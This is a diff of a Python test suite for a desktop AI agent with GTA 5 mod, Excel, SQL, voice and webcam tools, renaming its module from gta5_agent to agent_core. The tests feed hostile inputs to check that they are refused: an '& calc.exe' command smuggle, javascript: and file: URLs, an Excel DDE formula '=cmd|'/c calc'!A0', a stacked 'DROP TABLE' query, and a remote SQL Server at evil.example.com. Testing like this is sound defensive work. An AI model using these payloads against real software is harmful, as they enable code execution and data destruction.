-        self.assertFalse(gta5_agent._transient_network_error(FileNotFoundError("missing")))
+        self.assertTrue(agent_core._transient_network_error(error))
+        self.assertFalse(agent_core._transient_network_error(FileNotFoundError("missing")))
 
     def test_launch_matches_start_menu_and_rejects_shell_text(self) -> None:
         menu = self.root / "start" / "Programs"
         menu.mkdir(parents=True)
         shortcut = menu / "Widget Studio.lnk"
         shortcut.write_bytes(b"")
-        gta5_agent.start_menu_override = self.root / "start"
+        agent_core.start_menu_override = self.root / "start"
         started: list[str] = []
-        gta5_agent._start_target = lambda target: started.append(str(target))
+        agent_core._start_target = lambda target: started.append(str(target))
 
-        opened = gta5_agent.launch_application("widget studio")
+        opened = agent_core.launch_application("widget studio")
         self.assertTrue(opened["ok"])
         self.assertEqual(Path(started[0]), shortcut)
-        rejected = gta5_agent.launch_application("widget & calc.exe")
+        rejected = agent_core.launch_application("widget & calc.exe")
         self.assertFalse(rejected["ok"])
         self.assertEqual(len(started), 1)
 
     def test_browser_tools_build_safe_addresses(self) -> None:
         self.assertEqual(
-            gta5_agent._youtube_search_url("GTA 5 mods"),
+            agent_core._youtube_search_url("GTA 5 mods"),
             "https://www.youtube.com/results?search_query=GTA+5+mods",
         )
-        blocked = gta5_agent.open_website("file:///C:/Windows/notepad.exe")
+        blocked = agent_core.open_website("file:///C:/Windows/notepad.exe")
         self.assertFalse(blocked["ok"])
-        script = gta5_agent.open_website("javascript:alert(1)")
+        script = agent_core.open_website("javascript:alert(1)")
         self.assertFalse(script["ok"])
 
     def test_excel_task_saves_on_pedro_and_blocks_formulas(self) -> None:
         drive = self.root / "pedrodrive"
         drive.mkdir()
-        gta5_agent._volumes = lambda: [(str(drive) + "\\", "GameDrive")]
+        agent_core._volumes = lambda: [(str(drive) + "\\", "GameDrive")]
         instructions = json.dumps(
             {"sheet": "Sales", "headers": ["Item", "Amount"], "rows": [["Hats", 12]]}
         )
-        saved = gta5_agent.automate_excel_task("GameDrive/reports/sales.xlsx", instructions)
+        saved = agent_core.automate_excel_task("GameDrive/reports/sales.xlsx", instructions)
         self.assertTrue(saved["ok"], saved)
         workbook_path = drive / "reports" / "sales.xlsx"
         self.assertTrue(workbook_path.is_file())
@@ -765,9 +765,9 @@ class AgentToolTests(unittest.TestCase):
         dangerous = json.dumps(
             {"sheet": "Sales", "headers": ["Item"], "rows": [["=cmd|'/c calc'!A0"]]}
         )
-        refused = gta5_agent.automate_excel_task(str(workbook_path), dangerous)
+        refused = agent_core.automate_excel_task(str(workbook_path), dangerous)
         self.assertFalse(refused["ok"])
-        system_path = gta5_agent.automate_excel_task(
+        system_path = agent_core.automate_excel_task(
             r"C:\Windows\sales.xlsx",
             instructions,
         )
@@ -775,20 +775,20 @@ class AgentToolTests(unittest.TestCase):
 
     def test_sql_task_exports_and_blocks_unsafe_statements(self) -> None:
         database = self.root / "workspace" / "shop.db"
-        created = gta5_agent.execute_sql_task(
+        created = agent_core.execute_sql_task(
             str(database),
             "CREATE TABLE sale (item TEXT, amount INT)",
             allow_changes=True,
         )
         self.assertTrue(created["ok"], created)
-        inserted = gta5_agent.execute_sql_task(
+        inserted = agent_core.execute_sql_task(
             str(database),
             "INSERT INTO sale VALUES ('Hats', 12)",
             allow_changes=True,
         )
         self.assertTrue(inserted["ok"], inserted)
         output = self.root / "workspace" / "sale.csv"
-        selected = gta5_agent.execute_sql_task(
+        selected = agent_core.execute_sql_task(
             str(database),
             "SELECT item, amount FROM sale",
             str(output),
@@ -796,21 +796,21 @@ class AgentToolTests(unittest.TestCase):
         self.assertTrue(selected["ok"], selected)
         self.assertIn("Hats,12", output.read_text(encoding="utf-8"))
 
-        attached = gta5_agent.execute_sql_task(
+        attached = agent_core.execute_sql_task(
             str(database),
             "ATTACH DATABASE 'other.db' AS other",
             allow_changes=True,
         )
         self.assertFalse(attached["ok"])
-        dropped = gta5_agent.execute_sql_task(str(database), "DROP TABLE sale")
+        dropped = agent_core.execute_sql_task(str(database), "DROP TABLE sale")
         self.assertFalse(dropped["ok"])
         self.assertIn("allow_changes", dropped["error"])
-        stacked = gta5_agent.execute_sql_task(
+        stacked = agent_core.execute_sql_task(
             str(database),
             "SELECT 1; DROP TABLE sale",
         )
         self.assertFalse(stacked["ok"])
-        remote = gta5_agent.execute_sql_task(
+        remote = agent_core.execute_sql_task(
             "Driver={SQL Server};Server=evil.example.com;Database=x;",
             "SELECT 1",
         )
@@ -827,33 +827,33 @@ class AgentToolTests(unittest.TestCase):
         def explode(source: Path, dest: Path) -> None:
             raise PermissionError("used by another process")
 
-        original = gta5_agent.shutil.copy2
-        gta5_agent.shutil.copy2 = explode
-        self.addCleanup(setattr, gta5_agent.shutil, "copy2", original)
+        original = agent_core.shutil.copy2
+        agent_core.shutil.copy2 = explode
+        self.addCleanup(setattr, agent_core.shutil, "copy2", original)
         source = self.root / "MyMod.dll"
         source.write_bytes(b"new")
-        result = gta5_agent.copy_mod_files(str(source), "scripts", overwrite=True)
+        result = agent_core.copy_mod_files(str(source), "scripts", overwrite=True)
         self.assertFalse(result["ok"])
         self.assertIn("Close Grand Theft Auto V", result["error"])
 
     def test_voice_commands_stay_out_of_the_model_tools(self) -> None:
-        names = [item["name"] for item in gta5_agent.TOOL_DECLARATIONS]
-        self.assertNotIn("listen_to_microphone", gta5_agent.TOOLS)
-        self.assertNotIn("speak_response", gta5_agent.TOOLS)
+        names = [item["name"] for item in agent_core.TOOL_DECLARATIONS]
+        self.assertNotIn("listen_to_microphone", agent_core.TOOLS)
+        self.assertNotIn("speak_response", agent_core.TOOLS)
         self.assertNotIn("listen_to_microphone", names)
         self.assertNotIn("speak_response", names)
-        self.assertEqual(gta5_agent.local_input_command("V", spoken=False), "voice")
+        self.assertEqual(agent_core.local_input_command("V", spoken=False), "voice")
         self.assertEqual(
-            gta5_agent.local_input_command("Text mode.", spoken=True),
+            agent_core.local_input_command("Text mode.", spoken=True),
             "text",
         )
-        self.assertEqual(gta5_agent.local_input_command("exit", spoken=True), "exit")
+        self.assertEqual(agent_core.local_input_command("exit", spoken=True), "exit")
         self.assertIsNone(
-            gta5_agent.local_input_command("Install text mode pack", spoken=True)
+            agent_core.local_input_command("Install text mode pack", spoken=True)
         )
-        self.assertIsNone(gta5_agent.local_input_command("Open Excel", spoken=False))
-        self.assertEqual(gta5_agent._mode_from_key("T"), "text")
-        self.assertEqual(gta5_agent._mode_from_key("v"), "voice")
+        self.assertIsNone(agent_core.local_input_command("Open Excel", spoken=False))
+        self.assertEqual(agent_core._mode_from_key("T"), "text")
+        self.assertEqual(agent_core._mode_from_key("v"), "voice")
 
     def test_windows_audio_wheel_is_used_as_pyaudio(self) -> None:
         fake = types.ModuleType("pyaudiowpatch")
@@ -861,7 +861,7 @@ class AgentToolTests(unittest.TestCase):
             sys.modules,
             {"pyaudio": None, "pyaudiowpatch": fake},
         ):
-            gta5_agent._ensure_pyaudio()
+            agent_core._ensure_pyaudio()
             self.assertIs(sys.modules["pyaudio"], fake)
 
     def test_listen_transcribes_and_reports_microphone_errors(self) -> None:
@@ -881,7 +881,7 @@ class AgentToolTests(unittest.TestCase):
             return real_listen(self, source, timeout, phrase_time_limit)
 
         speech.Recognizer.listen = listen
-        heard = gta5_agent.listen_to_microphone(
+        heard = agent_core.listen_to_microphone(
             speech_module=speech,
             whisper_loader=_whisper_must_not_run,
         )
@@ -890,7 +890,7 @@ class AgentToolTests(unittest.TestCase):
         self.assertEqual(captured["pause_threshold"], 2.0)
         self.assertEqual(
             captured["non_speaking_duration"],
-            gta5_agent.LISTEN_NON_SPEAKING_SECONDS,
+            agent_core.LISTEN_NON_SPEAKING_SECONDS,
         )
         self.assertLessEqual(
             captured["non_speaking_duration"],
@@ -899,49 +899,49 @@ class AgentToolTests(unittest.TestCase):
         self.assertIsNone(captured["phrase_time_limit"])
 
         quiet = _speech_module(listen="timeout")
-        timed_out = gta5_agent.listen_to_microphone(speech_module=quiet)
+        timed_out = agent_core.listen_to_microphone(speech_module=quiet)
         self.assertFalse(timed_out["ok"])
         self.assertIn("No speech", timed_out["error"])
-        self.assertFalse(gta5_agent._voice_hardware_failure(timed_out["error"]))
+        self.assertFalse(agent_core._voice_hardware_failure(timed_out["error"]))
 
         unclear = _speech_module(google="unknown")
-        missed = gta5_agent.listen_to_microphone(speech_module=unclear)
+        missed = agent_core.listen_to_microphone(speech_module=unclear)
         self.assertIn("understand", missed["error"])
 
         offline = _speech_module(google="request")
-        fallback = gta5_agent.listen_to_microphone(
+        fallback = agent_core.listen_to_microphone(
             speech_module=offline,
             whisper_loader=lambda: object(),
         )
         self.assertTrue(fallback["ok"])
         self.assertEqual(fallback["text"], "Open Excel")
 
-        no_whisper = gta5_agent.listen_to_microphone(
+        no_whisper = agent_core.listen_to_microphone(
             speech_module=offline,
             whisper_loader=_missing_whisper,
         )
         self.assertFalse(no_whisper["ok"])
         self.assertIn("Whisper", no_whisper["error"])
-        self.assertFalse(gta5_agent._voice_hardware_failure(no_whisper["error"]))
+        self.assertFalse(agent_core._voice_hardware_failure(no_whisper["error"]))
 
         missing_mic = _speech_module(microphone="missing")
-        blocked = gta5_agent.listen_to_microphone(speech_module=missing_mic)
+        blocked = agent_core.listen_to_microphone(speech_module=missing_mic)
         self.assertIn("No microphone", blocked["error"])
-        self.assertTrue(gta5_agent._voice_hardware_failure(blocked["error"]))
+        self.assertTrue(agent_core._voice_hardware_failure(blocked["error"]))
 
         missing_audio = _speech_module(microphone="pyaudio")
-        unavailable = gta5_agent.listen_to_microphone(speech_module=missing_audio)
+        unavailable = agent_core.listen_to_microphone(speech_module=missing_audio)
         self.assertIn("PyAudio", unavailable["error"])
-        self.assertTrue(gta5_agent._voice_hardware_failure(unavailable["error"]))
+        self.assertTrue(agent_core._voice_hardware_failure(unavailable["error"]))
 
         with mock.patch.object(
-            gta5_agent,
+            agent_core,
             "_load_speech_recognition",
             side_effect=ImportError("no module"),
         ):
-            missing = gta5_agent.listen_to_microphone()
+            missing = agent_core.listen_to_microphone()
         self.assertIn("speech_recognition", missing["error"])
-        self.assertTrue(gta5_agent._voice_hardware_failure(missing["error"]))
+        self.assertTrue(agent_core._voice_hardware_failure(missing["error"]))
 
     def test_speak_response_uses_the_neural_voice_and_hides_failures(self) -> None:
         played: list[Path] = []
@@ -955,7 +955,7 @@ class AgentToolTests(unittest.TestCase):
             self.assertEqual(path.read_bytes(), b"mp3-bytes")
             played.append(path)
 
-        spoken = gta5_agent.speak_response(
+        spoken = agent_core.speak_response(
             "  Open   Excel. ",
             synthesizer=synthesize,
             player=play,
@@ -975,7 +975,7 @@ class AgentToolTests(unittest.TestCase):
             voices.append(voice)
             destination.write_bytes(b"mp3")
 
-        named = gta5_agent.speak_response(
+        named = agent_core.speak_response(
             "Hello",
             synthesizer=synthesize_named,
             player=lambda path: None,
@@ -986,7 +986,7 @@ class AgentToolTests(unittest.TestCase):
         def fail_playback(path: Path) -> None:
             raise RuntimeError("mixer busy")
 
-        failed = gta5_agent.speak_response(
+        failed = agent_core.speak_response(
             "Hi",
             synthesizer=lambda text, destination, voice: destination.write_bytes(b"x"),
             player=fail_playback,
@@ -994,7 +994,7 @@ class AgentToolTests(unittest.TestCase):
         self.assertFalse(failed["ok"])
         self.assertIn("mixer busy", failed["error"])
 
-        missing = gta5_agent.speak_response(
+        missing = agent_core.speak_response(
             "Hi",
             synthesizer=lambda text, destination, voice: (_ for _ in ()).throw(
                 ImportError("No module named 'edge_tts'")
@@ -1002,7 +1002,7 @@ class AgentToolTests(unittest.TestCase):
         )
         self.assertIn("edge-tts", missing["error"])
 
-        silent = gta5_agent.speak_response(
+        silent = agent_core.speak_response(
             "Hi",
             synthesizer=lambda text, destination, voice: None,
             player=lambda path: None,
@@ -1013,14 +1013,14 @@ class AgentToolTests(unittest.TestCase):
         raw = "See **bold** and `code` in [# heading](https://example.com/a)."
         display = " ".join(raw.split())
         self.assertEqual(
-            gta5_agent.clean_text_for_tts(raw),
+            agent_core.clean_text_for_tts(raw),
             "See bold and code in heading.",
         )
         self.assertEqual(
-            gta5_agent.clean_text_for_tts("Read [the notes](https://example.com)."),
+            agent_core.clean_text_for_tts("Read [the notes](https://example.com)."),
             "Read the notes.",
         )
-        self.assertEqual(gta5_agent.clean_text_for_tts("*** ` ` ###"), "")
+        self.assertEqual(agent_core.clean_text_for_tts("*** ` ` ###"), "")
 
         heard: list[str] = []
 
@@ -1028,7 +1028,7 @@ class AgentToolTests(unittest.TestCase):
             heard.append(text)
             destination.write_bytes(b"mp3")
 
-        spoken = gta5_agent.speak_response(
+        spoken = agent_core.speak_response(
             raw,
             synthesizer=synthesize,
             player=lambda path: None,
@@ -1038,7 +1038,7 @@ class AgentToolTests(unittest.TestCase):
         self.assertIn("**", spoken["text"])
         self.assertEqual(heard, ["See bold and code in heading."])
 
-        skipped = gta5_agent.speak_response(
+        skipped = agent_core.speak_response(
             "***",
             synthesizer=synthesize,
             player=lambda path: None,
@@ -1053,7 +1053,7 @@ class AgentToolTests(unittest.TestCase):
             pipeline_heard.append(text)
             destination.write_bytes(b"mp3")
 
-        pipeline = gta5_agent._SpeechPipeline(
+        pipeline = agent_core._SpeechPipeline(
             synthesizer=synthesize_sentence,
             player=lambda path: None,
         )
@@ -1086,8 +1086,8 @@ class AgentToolTests(unittest.TestCase):
         fake.Communicate = Communicate
         destination = self.root / "reply.mp3"
         with mock.patch.dict(sys.modules, {"edge_tts": fake}):
-            gta5_agent._run_coroutine(
-                gta5_agent._stream_neural_speech(
+            agent_core._run_coroutine(
+                agent_core._stream_neural_speech(
                     "Hi",
                     "en-US-AriaNeural",
                     destination,
@@ -1097,8 +1097,8 @@ class AgentToolTests(unittest.TestCase):
         self.assertEqual(destination.read_bytes(), b"abcdef")
 
         with mock.patch.dict(sys.modules, {"edge_tts": fake}):
-            gta5_agent._run_coroutine(
-                gta5_agent._stream_neural_speech(
+            agent_core._run_coroutine(
+                agent_core._stream_neural_speech(
                     "Use **mods** from [Pedro](https://example.com).",
                     "en-US-AriaNeural",
                     destination,
@@ -1128,12 +1128,12 @@ class AgentToolTests(unittest.TestCase):
         empty_path = self.root / "empty.mp3"
         with mock.patch.dict(sys.modules, {"edge_tts": empty}):
             with self.assertRaises(RuntimeError):
-                gta5_agent._run_coroutine(
-                    gta5_agent._stream_neural_speech("Hi", "en-US-AriaNeural", empty_path)
+                agent_core._run_coroutine(
+                    agent_core._stream_neural_speech("Hi", "en-US-AriaNeural", empty_path)
                 )
 
     def test_sentences_split_as_soon_as_punctuation_arrives(self) -> None:
-        buffer = gta5_agent._SentenceBuffer()
+        buffer = agent_core._SentenceBuffer()
         self.assertEqual(buffer.push("First sentence. "), ["First sentence."])
         self.assertEqual(buffer.pending, "")
         self.assertEqual(buffer.push("Second"), [])
@@ -1142,10 +1142,10 @@ class AgentToolTests(unittest.TestCase):
         self.assertEqual(buffer.flush(), ["Two."])
 
         long_text = ("alpha " * 40).strip()
-        limited = gta5_agent._SentenceBuffer()
+        limited = agent_core._SentenceBuffer()
         pieces = limited.push(long_text)
         self.assertTrue(pieces)
-        self.assertLessEqual(len(pieces[0]), gta5_agent.VOICE_SENTENCE_CHARS)
+        self.assertLessEqual(len(pieces[0]), agent_core.VOICE_SENTENCE_CHARS)
         self.assertTrue(limited.flush())
 
     def test_voice_stream_speaks_the_first_sentence_before_the_rest(self) -> None:
@@ -1167,7 +1167,7 @@ class AgentToolTests(unittest.TestCase):
                 self.assertFalse(pulled_second["yes"])
                 release.set()
 
-        _parts, _calls, text = gta5_agent._accumulate_voice_stream(
+        _parts, _calls, text = agent_core._accumulate_voice_stream(
             chunks(),
             on_sentence,
             None,
@@ -1177,7 +1177,7 @@ class AgentToolTests(unittest.TestCase):
         self.assertIn("Second sentence.", text)
 
         repeated: list[str] = []
-        _parts, _calls, repeated_text = gta5_agent._accumulate_voice_stream(
+        _parts, _calls, repeated_text = agent_core._accumulate_voice_stream(
             [
                 _voice_chunk(_voice_text("First sentence. ")),
                 _voice_chunk(_voice_text("First sentence. Second sentence.")),
@@ -1195,7 +1195,7 @@ class AgentToolTests(unittest.TestCase):
             spoken.append(sentence)
             cancel.set()
 
-        gta5_agent._accumulate_voice_stream(
+        agent_core._accumulate_voice_stream(
             [
                 _voice_chunk(_voice_text("First sentence. ")),
                 _voice_chunk(
@@ -1210,7 +1210,7 @@ class AgentToolTests(unittest.TestCase):
         self.assertEqual(spoken, ["First sentence."])
 
         thought_only: list[str] = []
-        parts, calls, quiet = gta5_agent._accumulate_voice_stream(
+        parts, calls, quiet = agent_core._accumulate_voice_stream(
             [
                 _voice_chunk(_voice_text("planning", thought=True)),
                 _voice_chunk(_voice_call("click_element", {"x": 1}, "a")),
@@ -1243,7 +1243,7 @@ class AgentToolTests(unittest.TestCase):
             order.append("play")
             playing.set()
 
-        pipeline = gta5_agent._SpeechPipeline(synthesizer=synthesize, player=play)
+        pipeline = agent_core._SpeechPipeline(synthesizer=synthesize, player=play)
         self.addCleanup(pipeline.abort)
         pipeline.submit("First sentence.")
         pipeline.submit("Second sentence.")
@@ -1254,23 +1254,23 @@ class AgentToolTests(unittest.TestCase):
         self.assertFalse(pipeline.cancel.is_set())
 
     def test_voice_config_is_capped_and_text_config_is_not(self) -> None:
-        voiced, plain = gta5_agent._model_configs(True)
-        typed, extra = gta5_agent._model_configs(False)
-        self.assertEqual(voiced.max_output_tokens, gta5_agent.VOICE_MAX_OUTPUT_TOKENS)
+        voiced, plain = agent_core._model_configs(True)
+        typed, extra = agent_core._model_configs(False)
+        self.assertEqual(voiced.max_output_tokens, agent_core.VOICE_MAX_OUTPUT_TOKENS)
         self.assertIn("MINIMAL", str(voiced.thinking_config.thinking_level))
         self.assertIsNone(plain.thinking_config)
-        self.assertEqual(plain.max_output_tokens, gta5_agent.VOICE_MAX_OUTPUT_TOKENS)
+        self.assertEqual(plain.max_output_tokens, agent_core.VOICE_MAX_OUTPUT_TOKENS)
         self.assertIsNone(typed.max_output_tokens)
         self.assertIsNone(extra)
         self.assertIn("short spoken sentences", voiced.system_instruction)
         self.assertNotIn("short spoken sentences", typed.system_instruction)
         self.assertTrue(
-            gta5_agent._thinking_rejected(
+            agent_core._thinking_rejected(
                 RuntimeError("400 invalid argument: thinking_level is not supported")
             )
         )
         self.assertFalse(
-            gta5_agent._thinking_rejected(ConnectionError("connection reset"))
+            agent_core._thinking_rejected(ConnectionError("connection reset"))
         )
 
     def _restore_env(self, name: str, previous: str | None) -> None:
@@ -1319,29 +1319,29 @@ class AgentToolTests(unittest.TestCase):
         self.assertEqual(spoken, [])
 
     def test_barge_in_stops_playback_and_becomes_the_next_turn(self) -> None:
-        meter = gta5_agent._BargeMeter()
+        meter = agent_core._BargeMeter()
         quiet = _pcm_frame(100)
         loud = _pcm_frame(4000)
-        for _ in range(gta5_agent.BARGE_WARMUP_FRAMES):
+        for _ in range(agent_core.BARGE_WARMUP_FRAMES):
             self.assertEqual(meter.push(quiet), "continue")
         saw_speech = False
-        for _ in range(gta5_agent.BARGE_HOT_FRAMES + 2):
+        for _ in range(agent_core.BARGE_HOT_FRAMES + 2):
             if meter.push(loud) == "speech":
                 saw_speech = True
                 break
         self.assertTrue(saw_speech)
-        echo = gta5_agent._BargeMeter()
+        echo = agent_core._BargeMeter()
         speaker = _pcm_frame(2000)
-        for _ in range(gta5_agent.BARGE_WARMUP_FRAMES):
+        for _ in range(agent_core.BARGE_WARMUP_FRAMES):
             self.assertEqual(echo.push(speaker), "continue")
         self.assertEqual(echo.push(_pcm_frame(2600)), "continue")
         self.assertFalse(echo.speaking)
         self.assertEqual(echo.push(loud), "speech")
 
         frames = (
-            [quiet] * gta5_agent.BARGE_WARMUP_FRAMES
-            + [loud] * (gta5_agent.BARGE_HOT_FRAMES + 3)
-            + [quiet] * (gta5_agent.BARGE_TRAILING_FRAMES + 2)
+            [quiet] * agent_core.BARGE_WARMUP_FRAMES
+            + [loud] * (agent_core.BARGE_HOT_FRAMES + 3)
+            + [quiet] * (agent_core.BARGE_TRAILING_FRAMES + 2)
         )
         stopped = threading.Event()
 
@@ -1354,7 +1354,7 @@ class AgentToolTests(unittest.TestCase):
             return {"ok": True, "text": "Stop"}
 
         result = asyncio.run(
-            gta5_agent._barge_during_playback(
+            agent_core._barge_during_playback(
                 self.root / "reply.mp3",
                 frames=iter(frames),
                 player=player,
@@ -1364,15 +1364,15 @@ class AgentToolTests(unittest.TestCase):
         self.assertTrue(stopped.is_set())
         self.assertTrue(result.get("interrupted"))
         self.assertEqual(result.get("transcript"), "Stop")
-        follow = gta5_agent._barge_followup(result)
+        follow = agent_core._barge_followup(result)
         self.assertEqual(follow, {"ok": True, "text": "Stop"})
         self.assertEqual(
-            gta5_agent._barge_followup(
+            agent_core._barge_followup(
                 {"interrupted": True, "transcript": "text mode"}
             ),
             {"ok": True, "command": "text"},
         )
-        self.assertIsNone(gta5_agent._barge_followup({"ok": True, "text": "Hi"}))
+        self.assertIsNone(agent_core._barge_followup({"ok": True, "text": "Hi"}))
 
         prompts: list[str] = []
         spoken: list[str] = []
@@ -1402,13 +1402,13 @@ class AgentToolTests(unittest.TestCase):
             return replies.pop(0)
 
         with (
-            mock.patch.object(gta5_agent, "_watch_mode_keys", lambda pressed, stop: None),
-            mock.patch.object(gta5_agent, "_voice_turn", side_effect=fake_turn),
-            mock.patch.object(gta5_agent, "run_agent", side_effect=fake_run),
-            mock.patch.object(gta5_agent, "speak_response", side_effect=fake_speak),
+            mock.patch.object(agent_core, "_watch_mode_keys", lambda pressed, stop: None),
+            mock.patch.object(agent_core, "_voice_turn", side_effect=fake_turn),
+            mock.patch.object(agent_core, "run_agent", side_effect=fake_run),
+            mock.patch.object(agent_core, "speak_response", side_effect=fake_speak),
         ):
             outcome = asyncio.run(
-                gta5_agent._voice_session([], "gemini-3.5-flash-lite")
+                agent_core._voice_session([], "gemini-3.5-flash-lite")
             )
         self.assertEqual(outcome, "exit")
         self.assertEqual(prompts, ["Open Excel", "Stop"])
@@ -1416,19 +1416,19 @@ class AgentToolTests(unittest.TestCase):
         self.assertEqual(listens, [])
 
     def test_webcam_capture_is_one_frame_and_closes_the_camera(self) -> None:
-        names = [item["name"] for item in gta5_agent.TOOL_DECLARATIONS]
-        self.assertIn("capture_webcam_image", gta5_agent.TOOLS)
+        names = [item["name"] for item in agent_core.TOOL_DECLARATIONS]
+        self.assertIn("capture_webcam_image", agent_core.TOOLS)
         self.assertIn("capture_webcam_image", names)
         description = next(
             item["description"]
-            for item in gta5_agent.TOOL_DECLARATIONS
+            for item in agent_core.TOOL_DECLARATIONS
             if item["name"] == "capture_webcam_image"
         )
         self.assertIn("one frame", description.casefold())
         self.assertIn("close", description.casefold())
 
         with self.assertRaises(AssertionError):
-            gta5_agent.capture_webcam_image()
+            agent_core.capture_webcam_image()
 
         buffer = io.BytesIO()
         from PIL import Image
@@ -1441,7 +1441,7 @@ class AgentToolTests(unittest.TestCase):
             calls["n"] += 1
             return {"png": png}
 
-        gta5_agent.webcam_override = injected
+        agent_core.webcam_override = injected
         real_import = builtins.__import__
 
         def block_cv2(
@@ -1456,7 +1456,7 @@ class AgentToolTests(unittest.TestCase):
             return real_import(name, globals, locals, fromlist, level)
 
         with mock.patch("builtins.__import__", block_cv2):
-            shot = gta5_agent.capture_webcam_image()
+            shot = agent_core.capture_webcam_image()
         self.assertTrue(shot["ok"], shot)
         self.assertEqual(calls["n"], 1)
         self.assertEqual(shot["image_width"], 32)
@@ -1465,9 +1465,9 @@ class AgentToolTests(unittest.TestCase):
         self.assertEqual(shot["_screenshot_mime"], "image/jpeg")
         saved = Path(shot["path"])
         self.assertEqual(saved.name, "vision_capture.jpg")
-        self.assertEqual(saved.parent, gta5_agent.WORKSPACE)
+        self.assertEqual(saved.parent, agent_core.WORKSPACE)
         self.assertEqual(saved.read_bytes(), shot["_screenshot_bytes"])
-        part = gta5_agent._function_response("capture_webcam_image", shot, "cam-1")
+        part = agent_core._function_response("capture_webcam_image", shot, "cam-1")
         response = part.function_response
         self.assertNotIn("_screenshot_bytes", response.response)
         self.assertEqual(response.parts[0].inline_data.mime_type, "image/jpeg")
@@ -1476,8 +1476,8 @@ class AgentToolTests(unittest.TestCase):
         def empty() -> dict[str, object]:
             return {}
 
-        gta5_agent.webcam_override = empty
-        missing = gta5_agent.capture_webcam_image()
+        agent_core.webcam_override = empty
+        missing = agent_core.capture_webcam_image()
         self.assertFalse(missing["ok"])
         self.assertIn("no image", missing["error"].casefold())
 
@@ -1539,9 +1539,9 @@ class AgentToolTests(unittest.TestCase):
 
         fake.VideoCapture = video_capture
         fake.imwrite = imwrite
-        gta5_agent.webcam_override = None
+        agent_core.webcam_override = None
         with mock.patch.dict(sys.modules, {"cv2": fake}):
-            live = gta5_agent.capture_webcam_image()
+            live = agent_core.capture_webcam_image()
         self.assertTrue(live["ok"], live)
         self.assertEqual(len(opened), 1)
         camera = opened[0]
@@ -1560,7 +1560,7 @@ class AgentToolTests(unittest.TestCase):
         self.assertEqual(camera.props[fake.CAP_PROP_OPEN_TIMEOUT_MSEC], 4000)
         self.assertEqual(live["image_width"], 6)
         self.assertEqual(live["image_height"], 4)
-        self.assertEqual((gta5_agent.WORKSPACE / "vision_capture.jpg").read_bytes(), b"\xff\xd8\xff\xd9")
+        self.assertEqual((agent_core.WORKSPACE / "vision_capture.jpg").read_bytes(), b"\xff\xd8\xff\xd9")
 
         failed_open: list[FakeCapture] = []
 
@@ -1570,9 +1570,9 @@ class AgentToolTests(unittest.TestCase):
             return camera
 
         fake.VideoCapture = closed_capture
-        gta5_agent.webcam_override = None
+        agent_core.webcam_override = None
         with mock.patch.dict(sys.modules, {"cv2": fake}):
-            unavailable = gta5_agent.capture_webcam_image()
+            unavailable = agent_core.capture_webcam_image()
         self.assertFalse(unavailable["ok"])
         self.assertIn("privacy", unavailable["error"].casefold())
         self.assertEqual(len(failed_open), 1)
@@ -1595,15 +1595,15 @@ class AgentToolTests(unittest.TestCase):
             return camera
 
         fake.VideoCapture = hung_capture
-        gta5_agent.webcam_override = None
-        previous_timeout = gta5_agent.WEBCAM_TIMEOUT_SECONDS
-        gta5_agent.WEBCAM_TIMEOUT_SECONDS = 0.25
-        self.addCleanup(setattr, gta5_agent, "WEBCAM_TIMEOUT_SECONDS", previous_timeout)
+        agent_core.webcam_override = None
+        previous_timeout = agent_core.WEBCAM_TIMEOUT_SECONDS
+        agent_core.WEBCAM_TIMEOUT_SECONDS = 0.25
+        self.addCleanup(setattr, agent_core, "WEBCAM_TIMEOUT_SECONDS", previous_timeout)
         self.addCleanup(hung_gate.set)
-        started = gta5_agent.time.perf_counter()
+        started = agent_core.time.perf_counter()
         with mock.patch.dict(sys.modules, {"cv2": fake}):
-            timed_out = gta5_agent.capture_webcam_image()
-        elapsed = gta5_agent.time.perf_counter() - started
+            timed_out = agent_core.capture_webcam_image()
+        elapsed = agent_core.time.perf_counter() - started
         self.assertFalse(timed_out["ok"])
         self.assertIn("did not respond", timed_out["error"].casefold())
         self.assertLess(elapsed, 2.0)
@@ -1611,40 +1611,40 @@ class AgentToolTests(unittest.TestCase):
         self.assertEqual(hung_cameras[0].reads, 1)
 
     def test_memory_persists_and_is_added_to_the_prompt(self) -> None:
-        names = [item["name"] for item in gta5_agent.TOOL_DECLARATIONS]
-        self.assertIn("remember_fact", gta5_agent.TOOLS)
-        self.assertIn("recall_memory", gta5_agent.TOOLS)
+        names = [item["name"] for item in agent_core.TOOL_DECLARATIONS]
+        self.assertIn("remember_fact", agent_core.TOOLS)
+        self.assertIn("recall_memory", agent_core.TOOLS)
         self.assertIn("remember_fact", names)
         self.assertIn("recall_memory", names)
 
-        saved = gta5_agent.remember_fact("The user likes quiet installs.", "preference")
+        saved = agent_core.remember_fact("The user likes quiet installs.", "preference")
         self.assertTrue(saved["ok"])
-        again = gta5_agent.remember_fact("The user likes quiet installs.", "preference")
+        again = agent_core.remember_fact("The user likes quiet installs.", "preference")
         self.assertIn("already saved", again["message"])
-        recalled = gta5_agent.recall_memory("quiet installs")
+        recalled = agent_core.recall_memory("quiet installs")
         self.assertEqual(len(recalled["matches"]), 1)
         self.assertEqual(recalled["matches"][0]["topic"], "preference")
-        self.assertTrue((gta5_agent.WORKSPACE / "memory.sqlite").is_file())
+        self.assertTrue((agent_core.WORKSPACE / "memory.sqlite").is_file())
 
-        blocked = gta5_agent.remember_fact("password=hunter2")
+        blocked = agent_core.remember_fact("password=hunter2")
         self.assertFalse(blocked["ok"])
-        self.assertEqual(gta5_agent.recall_memory("hunter2")["matches"], [])
+        self.assertEqual(agent_core.recall_memory("hunter2")["matches"], [])
         self.assertFalse(
-            gta5_agent.remember_fact("hello", "secret")["ok"]
+            agent_core.remember_fact("hello", "secret")["ok"]
         )
 
-        gta5_agent._capture_user_memory(
+        agent_core._capture_user_memory(
             "My name is Pedro. Remember that AddonPeds is the layout."
         )
         self.assertTrue(
-            any("Pedro" in item["fact"] for item in gta5_agent.recall_memory("Pedro")["matches"])
+            any("Pedro" in item["fact"] for item in agent_core.recall_memory("Pedro")["matches"])
         )
         self.assertEqual(
-            gta5_agent.recall_memory("AddonPeds")["matches"][0]["topic"],
+            agent_core.recall_memory("AddonPeds")["matches"][0]["topic"],
             "instruction",
         )
 
-        gta5_agent._autosave_tool_memory(
+        agent_core._autosave_tool_memory(
             "locate_gta5_directory",
             {
                 "ok": True,
@@ -1653,18 +1653,18 @@ class AgentToolTests(unittest.TestCase):
                 "drive": "E:",
             },
         )
-        located = gta5_agent.recall_memory("Games GTA")
+        located = agent_core.recall_memory("Games GTA")
         self.assertIn("GameDrive", located["matches"][0]["fact"])
         self.assertEqual(located["matches"][0]["topic"], "path")
 
-        prompt = gta5_agent.system_prompt()
+        prompt = agent_core.system_prompt()
